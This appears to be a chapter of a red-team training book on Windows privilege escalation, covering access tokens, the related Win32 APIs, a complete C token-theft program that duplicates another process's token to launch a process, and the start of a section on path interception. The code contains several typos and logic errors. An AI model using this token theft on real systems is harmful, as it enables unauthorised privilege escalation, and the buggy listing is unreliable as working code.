<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Privilege Escalation Techniques with Malware - The Red Teamers Bible</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="src/mdbook-admonish.css">
        <link rel="stylesheet" href="src/custom.css">
        <link rel="stylesheet" href="./mdbook-admonish.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">The Red Teamers Bible</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="privilege-escalation-techniques-with-malware"><a class="header" href="#privilege-escalation-techniques-with-malware">Privilege Escalation Techniques with Malware</a></h1>
<p>At this point, you should be familiar with what a principal is, and how their access rights determine what actions they can take on a system, network, or domain. When a hacker initially compromises a target system, they may not have the level of privilege necessary to execute on their intent. Privilege escalation descibes the tactics and techniques used to gain higher rights on a system, network, or domain after the initial compromise.</p>
<h2 id="access-tokens"><a class="header" href="#access-tokens">Access Tokens</a></h2>
<p><strong>Access Tokens</strong> are a core element of the authentication process on Windows, created and managed by the <strong>Local Security Authority Subsystem Service</strong> (LSASS). They are responsible for identifying and describing the security context of a process or thread running on a system. Every time a user authenticates successfully, an access token is generated by <code>winlogon.exe</code>, by way of <code>lsass.exe</code>.</p>
<p>It includes the identity and privileges of the user account associated with the thread or process. Then, it is attached to the <code>userinit.exe</code> process, after which all child processes started by the user will inherit a copy of the access token and run under the privileges of the same access token.</p>
<p><img src="img/access_token_auth.png" alt="image" /></p>
<blockquote>
<p>Diagram of Access Token Generation After Authentication</p>
</blockquote>
<p>Windows developers can engage with the access token that represents their current login session in the <code>LSASS</code> process using different Win32 APIs. For instance, <code>DuplicateTokenEx</code> can be used to copy pre-existing tokens:</p>
<ul>
<li>
<p><code>DuplicateTokenEx</code>: A Windows API function that creates a new access token that duplicates an existing one. It can be found in <code>advapi32.dll</code>.</p>
<ul>
<li>The <code>Ex</code> variant allows you to:
<ul>
<li>Change the token type (i.e., <code>ImpersonationToken</code> -&gt; <code>Primary Token</code>), which is required to launch a new process via the <code>CreateProcessAsUser</code> function.</li>
<li>Define exactly what the new handle is allowed to do.</li>
<li>Set impersonation levels.</li>
</ul>
</li>
</ul>
<pre><code class="language-C">BOOL DuplicateTokenEx(
  [in] HANDLE hExistingToken,
  [in] DWORD dwDesiredAccess,
  [in, optional] LPSECURITY_ATTRIBUTES lpTokenAttributes,
  [in] SECURITY_IMPERSONATION_LEVEL ImpersonationLeve,
  [in] TOKEN_TYPE TokenType,
  [out] PHANDLE phNewToken
)
</code></pre>
<p>Here is a breakdown of the <code>DuplicateTokenEx</code> function's parameters:</p>
<ul>
<li>
<p><code>hExistingToken</code>: A handle to the original token, which must have been opened with <code>TOKEN_DUPLICATE</code> acess.</p>
</li>
<li>
<p><code>dwDesiredAccess</code>: Determines what actions can be performed using the handle to the new token. The values you can pass fall into three categories:</p>
<ul>
<li><strong>Specific Rights</strong>: The most common values used when you need to perform specific operations on a token.
<ul>
<li><code>TOKEN_DUPLICATE</code> (0x0002): Required to duplicate the token (often passed if you plan to clone this new token later).</li>
<li><code>TOKEN_QUERY</code> (0x0008): Required to query the token (i.e., getting the User SID or Group List)</li>
<li><code>TOKEN_ASSIGN_PRIMARY</code> (0x0001): Required to attach the new token to a process (used with <code>CreateProcessAsUser</code>).</li>
<li><code>TOKEN_IMPERSONATE</code> (0x0004): Required to attach the token to a thread for impersonation.</li>
<li><code>TOKEN_ADJUST_PRIVILEGES</code> (0x0020): Required to enable or disable privileges within the token.</li>
<li><code>TOKEN_ADJUST_DEFAULT</code> (0x0080): Required to change the default DACL or primary group of the token.</li>
</ul>
</li>
<li><strong>Standard Rights</strong>: A set of security permissions that apply to almost all type of <strong>Executive Objects</strong> (i.e., processes, thread, registry keys, and synchronization objects), governing the management of the object itself rather than the data it contains.
<ul>
<li><code>DELETE</code> (0x00010000): The right to delete the object.</li>
<li><code>READ_CONTROL</code> (0x00020000): The right to read the information in the object's security descriptor (the DACL), but not the SACL, which requires the special <code>ACCESS_SYSTEM_SECURITY</code> right.</li>
<li><code>WRITE_DAC</code> (0x00040000): The right to change who has access to the object by modifying the Discretionary Access Control List (DACL) in the security descriptor.</li>
<li><code>WRITE_OWNER</code> (0x00080000): The right to change the owner of the object in the security descriptor.</li>
</ul>
</li>
<li><strong>Generic Rights</strong>: Common bundles of standalone access rights that are utilized as opposed to combining each right manually using the OR (<code>|</code>) operator.
<ul>
<li><code>TOKEN_ALL_ACCESS</code>: Combines all possible specific and standard rights for a token, essentially creating a God-mode handle for that specific token.</li>
<li><code>TOKEN_READ</code>: Combines <code>STANDARD_RIGHTS_READ</code> and <code>TOKEN_QUERY</code>.</li>
<li><code>TOKEN_WRITE</code>: Combines <code>STANDARD_RIGHTS_WRITE</code>, <code>TOKEN_ADJUST_PRIVILEGES</code>, <code>TOKEN_ADJUST_GROUPS</code>, and <code>TOKEN_ADJUST_DEFAULT</code>.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>lpTokenAttributes</code>: A pointer to a <code>SECURITY_ATTRIBUTES</code> structure, that determines if the new handle can be inherited by child processes. Usually <code>NULL</code>.</p>
<ul>
<li><code>SECURITY_ATTRIBUTES</code>: a structure used in Windows programming, primarily when creating a new object (a file, process, thread, or even an access token) to define its security descriptor and its inheritance properties.</li>
</ul>
<p>Here is a breakdown of the structure's attributes:</p>
<pre><code class="language-C">typedef struct _SECURITY_ATTRIBUTES{
  DWORD nLength;
  LPVOID lpSecurityDescriptor;
  BOOL bInheritHandle;
}SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
</code></pre>
<p>Where:</p>
<ul>
<li><code>nLength</code>: The size of the structure in bytes. Should be equal to <code>sizeof(SECURITY_ATTRIBUTES)</code> before passing it to a function.</li>
<li><code>lpSecurityDescriptor</code>: A pointer to a <code>SECURITY_DESCRIPTOR</code> structure, which defines who owns the object and who has permission to use it.</li>
<li><code>bInheritHandle</code>: A boolean flag that determines if child processes can inherit the handle being created (<code>TRUE</code> for yes).</li>
</ul>
</li>
<li>
<p><code>ImpersonationLevel</code>: A critical setting that determines how much authority a server or profess has when it acts on behalf of another user. There are four levels defined in the <code>SECURITY_IMPERSONATION_LEVEL</code> enumeration:</p>
<ul>
<li><code>SecurityAnonymous</code>: Server can identify that a connection is being made, but cannot see any identifying information about the client.</li>
<li><code>SecurityIdentification</code>: The server can retrieve your <strong>Security Identifier</strong> (SID) and privileges to perform its own access checks, however it cannot access local resources using your identity.</li>
<li><code>SecurityImpersonation</code>: The serverr can access local resources as if it were the user, however it is limited to the local machine.</li>
<li><code>SecurityDelegate</code>: Allows the server to impersonate the user's security context on both local and remote systems.</li>
</ul>
</li>
<li>
<p><code>TokenType</code>: Tells the kernel what the intended function of the access token is (whether it is attached to a Process or a Thread). It can have one of two possible values:</p>
<ul>
<li><code>TokenPrimary</code>: An access token that is attached to a process, which defines the security context of the process including:
<ul>
<li>The <strong>User SID</strong></li>
<li>The <strong>Group SIDs</strong></li>
<li><strong>Privileges</strong> (i.e., <code>SeDebugPrivilege</code>, <code>SeShutdownPrivilege</code>, etc.)</li>
<li><strong>MIC Integrity Level</strong></li>
<li>The Default <strong>DACL</strong></li>
</ul>
</li>
</ul>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="#admonition-note"></a>
</div>
<div>
<p>If you intend to create a new access token to create a new process (i.e., using <code>CreateProcessAsUser</code>, <code>CreateProcessWithTokenW</code>, etc.) you must duplicate the existing token as a <code>TokenPrimary</code></p>
</div>
</div>
<ul>
<li><code>TokenImpersonation</code>: An access token used by a thread to take actions on a system on behalf of a user. If your program must temporarily act as a different user, it must be a <code>TokenImpersonation</code> type.</li>
</ul>
</li>
<li>
<p><code>phNewToken</code>: A pointer to the variable that receives the handle for the newly created clone token.</p>
</li>
</ul>
<p><code>DuplicateTokenEx</code> returns <code>TRUE</code> on success, <code>FALSE</code> on failue (i.e., <code>ERROR_ACCESS_DENIED</code>).</p>
</li>
</ul>
<p>There are a lot of reasons to duplicate a token. For instance, we may need our program to impersonate a user in order to temporarily act on their behalf. After duplicating the token, we would use the <code>ImpersonateLoggedOnUser</code> function to switch the security context of the thread to the selected user. This reverts back after the <code>RevertToSelf</code> function is called, the thread exits, or the token is otherwise revoked:</p>
<ul>
<li>
<p><code>ImpersonateLoggedOnUser</code>: A Win32 API that causes the calling thread to impersonate the security context contained in a token handle.</p>
<pre><code class="language-C">BOOL ImpersonateLoggedOnUser(
  [in] HANDLE hToken
);
</code></pre>
<p>Here is a breakdown of the <code>ImpersonateLoggedOnUser</code> function's parameters:</p>
<ul>
<li><code>hToken</code>: A handle to a primary or impersonation access token. The handle must have <code>TOKEN_QUERY</code> and <code>TOKEN_DUPLICATE </code> access rights.</li>
</ul>
<p><code>ImpersonateLoggedOnUser</code> returns <code>TRUE</code> on success and <code>FALSE</code> upon failure.</p>
</li>
</ul>
<p>A <strong>Locally Unique Identifier</strong> (LUID), is a 64-bit hexadecimal value used to identify locally unique entities on a system, such login sessions. Every access token must contain an <strong>Authentication ID</strong> (AuthID) parameter, which is used to identify the associated login session by utilizing the LUID. LUIDs can also be used to locally identify privileges on the system. The rights of a user account dictate what system actions can be performed by said account. The rights of a user encompass both the individual entitlements assigned to the user and the permissions granted to members of the group. These permissions are assigned by administrators and can be distringuished on the system by their assigned LUIDs. However, LUIDs are not exactly human-readable, so before you can perform any modifications to privileges, you must convert their human-readable names to their LUIDs using <code>LookupPrivilegeValue</code>:</p>
<pre><code class="language-C">BOOL LookupPrivilegeValueA(
  [in, optional] LPCSTR lpSystemName,
  [in] LPCSTR lpName,
  [out] PLUID lpLuid
);
</code></pre>
<p>Here is a breakdown of the <code>LookupPrivilegeValueA</code> function's parameters:</p>
<ul>
<li><code>lpSystemName</code>: A pointer to a string that specifies the name of the system where the privilege is being looked up. Passing <code>NULL</code> looks up the value on the local system.</li>
<li><code>lpName</code>: The null-terminated string of the privilege name (i.e., <code>SeDebugPrivilege</code>).</li>
<li><code>lpLuid</code>: A pointer to the <code>LUID</code> structure that will receive the translated 64-bit value.</li>
</ul>
<p><code>LookupPrivilegeValueA</code> returns <code>TRUE</code> on success, <code>FALSE</code> on failue (i.e., <code>ERROR_NO_SUCH_PRIVILEGE</code>).</p>
<p>Access tokens and privileges play a vital role in certain privilege escalation techniques. Knowing how to access and query these values is fundamentally important to crafting the perfect attack.</p>
<h2 id="token-theft"><a class="header" href="#token-theft">Token Theft</a></h2>
<p>Token theft is a technique where an attacker steals an existing access token from a running process and uses it to assume the identity and privileges of that user. It typically follows this sequence of steps:</p>
<ol>
<li><strong>Gain Access</strong>: Attacker must first have administrative of <code>SeDebugPrivilege</code> rights on the system to interact with other processes.</li>
<li><strong>Open the Source</strong>: Attacker identifies a high-privileged process (i.e., <code>winlogon.exe</code>) and calls <code>OpenProcess</code>.</li>
<li><strong>Extract the Token</strong>: Attacker calls <code>OpenProcessToken</code> to get a handle to that process' primary token.</li>
<li><strong>Duplicaet</strong>: Since they cannot use the original handle directly, they call <code>DuplicateTokenEx</code> to create a copy of it.</li>
<li><strong>Impersonate or Launch</strong>: The attacker either:</li>
</ol>
<ul>
<li>Creates an <code>Impersonation</code> token to act on behalf of the victim within their current process</li>
<li>Creates a <code>Primary</code> token to launch a new process on behalf of the victim, typically a new command shell with higher privileges.</li>
</ul>
<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
<div class="admonition-title">
<div id="admonition-note-1-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="#admonition-note-1"></a>
</div>
<div>
<p>Modern protection methods, such as <strong>Protected Process Light</strong> (PPL) and credential guard should be activated on a system to mitigate token theft.</p>
</div>
</div>
<p><img src="img/token_theft_seq.png" alt="image" /></p>
<blockquote>
<p>Diagram of the Token Theft Process</p>
</blockquote>
<p>For instance, in <code>C</code>, this can be implemented as follows:</p>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;iostream&gt;

BOOL setPrivilege(LPCTSTR priv){
  HANDLE token;
  TOKEN_PRIVILEGES token_privs;
  LUID luid;
  BOOL resp = TRUE;

  if (!LookupPrivilegeValue(NULL, priv, &amp;luid)) resp = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;token)) resp = FALSE;

  token_privs.PrivilegeCount = 1;
  token_privs.Privileges[0].LUID = luid;
  token_privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLE;

  if (!AdjustTokenPrivileges(token, FALSE, &amp;token_privs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) resp = FALSE;

  CloseHandle(token);
  return resp;
}

HANDLE getToken (DWORD pid){
  HANDLE cToken = NULL;
  HANDLE ph = NULL;
  if(pid == 0){
    ph = GetCurrentProcess();
  } else {
    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
  }

  if(!ph) cToken = (HANDLE)NULL;
  BOOL resp = OpenProcessToken(ph, MAXIMUM_ALLOWED, &amp;cToken);
  if(resp) cToken = (HANDLE)NULL;

  return cToken;
}

BOOL createProcess(HANDLE token, LPCWSTR app){
  HANDLE dToken = NULL;
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  BOOL resp = TRUE;
  ZeroMemory(&amp;si, sizeof(STARTUPINFOW));
  ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));
  si.cb = sizeof(STARTUPINFOW);

  resp = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokennPrimary, &amp;dToken);
  resp = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFIE, app, NULL, 0, NULL, NULL, &amp;si, &amp;pi);

  return resp;
}

int main (int argc, char** argv){
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  DWORD pid = atoi(argv[1]);
  HANDLE cToken = getToken(pid);
  if(!createProcess(cToken, L"C:\\Windows\\System32\\mspaint.exe")) return -1;
  return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>OpenProcessToken</code>: A vital Win32 API function used to retrieve the access token associated with a specific process. Located in <code>advapi32.dll</code>.</p>
<pre><code class="language-C">BOOL OpenProcessToken(
  [in] HANDLE ProcessHandle,
  [in] DWORD DesiredAccess,
  [out] PHANDLE TokenHandle
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>OpenProcessToken</code> function's parameters:
<ul>
<li><code>ProcessHandle</code>: A handle to the process whose access token you want to retrieve. It must have the <code>PROCESS_QUERY_INFORMATION</code> access right.</li>
<li><code>DesiredAccess</code>: An access mask specifying what you intend to do with the token.
<ul>
<li>See <code>DuplicateTokenEx</code> for value options.</li>
</ul>
</li>
<li><code>TokenHandle</code>: A pointer to a handle that receives the address of the newly opened access token if the function succeeds.</li>
</ul>
</li>
<li>The <code>OpenProcessToken</code> function returns <code>TRUE upon success, </code>FALSE<code>upon failure (i.e.,</code>ERROR_ACCESS_DENIED<code>if the</code>ProcessHandle` doesn't have enough permissions.)</li>
</ul>
</li>
</ul>
<ul>
<li>
<p><code>TOKEN_PRIVILEGES</code>: Used to describe a set of privileges for an access token. Essential when you want to query what privileges a process has or when you use <code>AdjustTokenPrivileges</code> to enable/disable them.</p>
<pre><code class="language-C">typedef struct _TOKEN_PRIVILEGES {
  DWORD PrivilegeCount;
  LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>TOKEN_PRIVILEGES</code> structure's attributes:</p>
<ul>
<li><code>PrivilegeCount</code>: Specifies the number of entries in the <code>Privileges</code> array.</li>
<li><code>Privileges[ANYSIZE_ARRAY]</code>: An array of structures representing each individual privilege.</li>
</ul>
<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
<div class="admonition-title">
<div id="admonition-note-2-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="#admonition-note-2"></a>
</div>
<div>
<p>If you need more than one privilege, you must manually allocate enough memory for the extra <code>LUID_AND_ATTRIBTUTES</code> elements:</p>
<pre><code class="language-C">  DWORD bufferSize = sizeof(TOKEN_PRIVILEGES)+(numPrivileges-1)*sizeof(LUID_AND_ATTRIBUTES);
  PTOKEN_PRIVILEGES pTokenPrivs = (PTOKEN_PRIVILEGES)malloc(bufferSize);
  pTokenPrivs.PrivilegeCount = numPrivileges;
</code></pre>
<ul>
<li>Here is a breakdown of the <code>LUID_AND_ATTRIBUTES</code> structure's attributes:
<ul>
<li><code>LUID</code>: The <strong>Locally Unique Identifier</strong> which represents a privilege on the local system (i.e., <code>SeDebugPrivilege</code>). This value is typically obtained by calling the <code>LookupPrivilegeValue</code> function.</li>
<li><code>Attributes</code>: A bitmask that defines the state of the privilege. The most common values include:
<ul>
<li><code>SE_PRIVILEGE_ENABLED</code> (0x00000002): Enables the privilege.</li>
<li><code>SE_PRIVILEGE_ENABLED_BY_DEFAULT</code> (0x00000001): The privilege is enabled by default (not relevant for our purposes here).</li>
<li><code>SE_PRIVILEGE_REMOVED</code> (0x00000004): The privilege is permanently removed from the token.</li>
<li><code>SE_PRIVILEGE_USED_FOR_ACCESS</code> (0x80000000): Privilege was used to gain access to an object.</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
</li>
</ul>
</li>
<li>
<p><code>AdjustTokenPrivileges</code>: A Windows API function from the Win32 API, which enables or disables privileges in a specified access token, which represents the security context of a process or thread.</p>
<pre><code class="language-C">BOOL AdjustTokenPrivileges(
  [in] HANDLE TokenHandle,
  [in] BOOL DisableAllPrivileges,
  [in] PTOKEN_PRIVILEGES NewState,
  [in] DWORD BufferLength,
  [in, optional] PTOKEN_PRIVILEGES PreviousState,
  [in, optional] PDWORD ReturnLength
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>AdjustTokenPrivileges</code> function's attributes:
<ul>
<li><code>TokenHandle</code>: The handle to the token you want to modify. It must have been opened with <code>TOKEN_ADJUST_PRIVILEGES</code> access.</li>
<li><code>DisableAllPrivileges</code>: Causes the function to disable all privileges and ignore the <code>NewState</code> parameter.</li>
<li><code>NewState</code>: A pointer to a <code>TOKEN_PRIVILEGES</code> structure, containing the <code>LUID</code>'s and the <code>SE_PRIVILEGE_ENABLED</code> attributes you want to set.</li>
<li><code>BufferLength</code>: The size, in bytes, or the <code>PreviousState</code> buffer. If <code>PreviousState</code> is <code>NULL</code>, this is <code>0</code>.</li>
<li><code>PreviousState</code>: A pointer to a buffer that receives the original state of any privileges the function modifies, allowing you to undo changes later.</li>
<li><code>ReturnLength</code>: A pointer to a variable that receives the required size of the <code>PreviousState</code> buffer.</li>
</ul>
</li>
<li><code>AdjustTokenPrivileges</code> can return <code>TRUE</code> even if it failed to adjust all privileges you requirested. Fo instance, if you try to enable <code>SedebugPrivilege</code> but you account doesn't actually possess that privilege in its token, the function returns <code>TRUE</code> because the function call completed, but the action failed.</li>
</ul>
<div id="admonition-note-3" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-3-title">
<div class="admonition-title">
<div id="admonition-note-3-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="#admonition-note-3"></a>
</div>
<div>
<p>To verify success, you must do this:</p>
<ol>
<li>Check if the return value is <code>TRUE</code></li>
<li>Immediately call <code>GetLastError()</code></li>
<li>If <code>GetLastError() == ERROR_NOT_ALL_ASSIGNED</code>, then at least one priivlege failed to enable.</li>
</ol>
</div>
</div>
</li>
</ul>
<ul>
<li>
<p><code>CreateProcessWithTokenW</code>: A powerful Win32 API which creates a new process and its primary thread in the security context of a specific user token. It is frequently used by services or administrative tools (i.e., <code>runas</code>) to launch a process as a different user. Asks the <code>Secondary Logon Service</code> to do the work for you. It's different from <code>CreateProcessAsUser</code>, as the function does not require the caller to have the <code>SeAssignePrimaryTokenPrivilege</code>, which is very restricted. Unlike other functions, it only exists in a <code>W</code> variant. <code>CreateProcessWithTokenW</code> can be found in <code>advapi32.dll</code>.</p>
<pre><code class="language-C">BOOL CreateProcessWithTokenW(
  HANDLE hToken,
  DWORD dwLogonFlags,
  LPCWSTR lpApplicationName,
  LPWSTR lpCommandLine,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCWSTR lpCurrentDirectory,
  LPSTARTUPINFOW lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre>
<ul>
<li>Here is a breakdown of the function's parameters:
<ul>
<li><code>hToken</code>: A handle to the primary token for the new process. This is usually obtained via <code>LogonUser</code> or <code>DuplicateTokenEx</code>.</li>
<li><code>dwLogonFlags</code> (0x00000001): Specifies the logon options regarding the user's profile for the new thread.
<ul>
<li><code>LOGON_WITH_PROFILE</code>: Loads the user profile (HKU, user environment) for the new process. Useful when the process needs the user reistry hive or profile resources.</li>
<li><code>LOGON_NETCREDENTIALS_ONLY</code> (0x00000002): Uses the token's credentials for outbound network authentication, but does not load the user profile. Local access uses the caller's account.</li>
<li><code>None</code> (0x00000000): The default setting. Does not load the profile. Standard token behavior.</li>
</ul>
</li>
<li><code>lpApplicationName</code>: The path to the executable. Can be <code>NULL</code> if the path is in the <code>lpCommandLine</code> argument.</li>
<li><code>lpCommandLine</code>: The command line string to execute.</li>
<li><code>dwCreationFlags</code>: Controls how the process is created (i.e., <code>CREATE_SUSPENDED</code>, <code>CREATE_NO_WINDOW</code>)</li>
<li><code>lpEnvironment</code>: A pointer to an environment block. If <code>NULL</code> the new process uses an environment created from the user's token.</li>
<li><code>lpCurrentDirectory</code>: The working directory for the new process.</li>
<li><code>lpStartupInfo</code>: Structure defining window appearance and standard handles (<code>stdin</code>/<code>stdout</code>)</li>
<li><code>lpProcessInformation</code>: Structure that receives the new Process/Thread handles and IDs.</li>
</ul>
</li>
</ul>
<div id="admonition-note-4" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-4-title">
<div class="admonition-title">
<div id="admonition-note-4-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="#admonition-note-4"></a>
</div>
<div>
<p>There are 3 critical requirements which must be met in order for <code>CreateProcessWithTokenW</code> to work as intended:</p>
<ol>
<li><strong>The Secondary Logon Service</strong>: The service <code>seclogon</code> must be running, otherwise the function will fail with <code>ERROR_SERVICE_DISABLED</code>.</li>
<li><strong>Token Type</strong>: The <code>hToken</code> must be a Priary Token, not an impersonation token</li>
<li><strong>Permissions</strong>: The caller must have the identity of the user they are trying to launch, have the <code>SeDebugPrivilege</code>, or be part of the Administrators group.</li>
</ol>
<ul>
<li>By having the <code>SeDebugPrivilege</code>, the system treats the request to open and duplicate another user's token as a legitimate debugging action.</li>
</ul>
</div>
</div>
<ul>
<li>The <code>CreateProcessWithTokenW</code> function returns <code>TRUE</code> upon success, <code>FALSE</code> upon failure.</li>
</ul>
</li>
</ul>
<h2 id="path-interception"><a class="header" href="#path-interception">Path Interception</a></h2>
<p><strong>Path Interception</strong> is a vulnerability that occurs when an executable can be placed in a location which allows it to highjack the execution path of another, intended application. When the target program is executed with an elevated security context, this can result in privilege escalation. There are 3 variations of this vulnerability that we will review here: The <strong><code>PATH</code> Environment Variable</strong>, <strong>Search Order Highjacking</strong>, and <strong>Unquoted Paths</strong>.</p>
<h3 id="path-environment-variable"><a class="header" href="#path-environment-variable"><a href="https://attack.mitre.org/techniques/T1574/007/">Path Environment Variable</a></a></h3>
<p>The <code>PATH</code> environment variable contains a list of directories, which Windows uses to resolve the locations of common programs. For instance, <code>schtasks</code>, the program we use to enumerate scheduled tasks, exists at <code>C:\Windows\System32\schtasks.exe</code>. When you run <code>schtasks</code> at the Command line, the OS searches each directory, in order until it comes across <code>schtasks.exe</code> in <code>%SystemRoot%\system32</code>.</p>
<div id="admonition-note-5" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-5-title">
<div class="admonition-title">
<div id="admonition-note-5-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="#admonition-note-5"></a>
</div>
<div>
<p>Verify this by running:</p>
<pre><code class="language-C">$ reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path
</code></pre>
</div>
</div>
<p>System processes use the <code>Path</code> variable found at <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path</code>, or the Machine Path. User processes search the Machine Path, then search through the User Path, found at <code>HKCU\Environment\Path</code>.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
